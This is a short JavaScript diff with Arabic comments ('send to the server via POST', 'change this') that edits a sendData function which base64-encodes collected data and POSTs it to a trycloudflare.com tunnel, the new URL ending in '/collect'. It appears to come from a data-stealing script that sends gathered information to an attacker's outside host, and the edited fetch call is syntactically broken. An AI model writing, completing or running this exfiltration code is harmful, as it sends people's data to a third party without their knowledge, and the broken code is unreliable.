@@ -84,8 +84,8 @@
     // 6. إرسال إلى السيرفر (عبر POST)
     function sendData(data) {
         var encoded = toBase64(JSON.stringify(data));
-        var server = ' https://slip-ones-cardiac-alter.trycloudflare.com';  // غيّر هذا
-        fetch(server, {
+        var server = ' ';  // غيّر هذا
+        fetch(server, 'https://result-visited-concord-icons.trycloudflare.com/collect')
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ payload: encoded })
